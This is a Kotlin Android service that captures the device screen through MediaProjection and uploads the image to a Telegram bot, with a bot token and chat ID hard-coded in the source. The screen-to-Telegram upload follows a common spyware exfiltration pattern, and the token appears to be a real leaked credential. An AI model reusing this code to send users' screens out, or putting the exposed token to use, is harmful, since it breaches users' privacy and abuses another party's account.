package com.example.myapplication.services

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.*
import java.net.HttpURLConnection
import java.net.URL

class ScreenshotService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    
    // Replace with your actual bot token and chat ID
    private val BOT_TOKEN = "8930369834:AAEVDMSBbZ9A1ticeyypjBTzBGIJbeixZRM"
    private val CHAT_ID = "8587971818"

    override fun onBind(intent: Intent?): IBinder? = null

    @SuppressLint("ForegroundServiceType")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra("RESULT_CODE", Activity.RESULT_CANCELED) ?: Activity.RESULT_CANCELED
        val data = intent?.getParcelableExtra<Intent>("DATA")

        if (data != null) {
            startForegroundServiceWithNotification()
            
            val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mpManager.getMediaProjection(resultCode, data)
            
            Handler(Looper.getMainLooper()).postDelayed({
                takeScreenshot()
            }, 1000)
        }

        return START_NOT_STICKY
    }

    private fun startForegroundServiceWithNotification() {
        val channelId = "screenshot_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Screenshot Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Screen Capture")
            .setContentText("Capturing screenshot...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()

        startForeground(1, notification)
    }

    private fun takeScreenshot() {
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val windowMetrics = windowManager.currentWindowMetrics
            val bounds = windowMetrics.bounds
            metrics.widthPixels = bounds.width()
            metrics.heightPixels = bounds.height()
            metrics.densityDpi = resources.configuration.densityDpi
        } else {
            windowManager.defaultDisplay.getRealMetrics(metrics)
        }
        
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "Screenshot",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY or DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,
            imageReader?.surface, null, null
        )

        imageReader?.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(buffer)
                
                val finalBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                
                image.close()
                stopCapture()

                Thread {
                    sendToTelegram(finalBitmap)
                }.start()
            }
        }, null)
    }

    private fun stopCapture() {
        virtualDisplay?.release()
        imageReader?.setOnImageAvailableListener(null, null)
        mediaProjection?.stop()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            stopForeground(true)
        }
        stopSelf()
    }

    private fun sendToTelegram(bitmap: Bitmap) {
        try {
            val file = File(cacheDir, "screenshot.png")
            val fos = FileOutputStream(file)
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos)
            fos.close()

            val boundary = "Boundary-" + System.currentTimeMillis()
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
            val conn = url.openConnection() as HttpURLConnection
            conn.doOutput = true
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val outputStream = conn.outputStream
            val writer = PrintWriter(OutputStreamWriter(outputStream, "UTF-8"), true)

            writer.append("--$boundary").append("\r\n")
            writer.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n")
            writer.append(CHAT_ID).append("\r\n")

            writer.append("--$boundary").append("\r\n")
            writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"${file.name}\"").append("\r\n")
            writer.append("Content-Type: image/png").append("\r\n\r\n")
            writer.flush()

            val inputStream = FileInputStream(file)
            val buffer = ByteArray(4096)
            var bytesRead: Int
            while (inputStream.read(buffer).also { bytesRead = it } != -1) {
                outputStream.write(buffer, 0, bytesRead)
            }
            outputStream.flush()
            inputStream.close()

            writer.append("\r\n").append("--$boundary--").append("\r\n")
            writer.close()

            val responseCode = conn.responseCode
            // Log response if needed
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}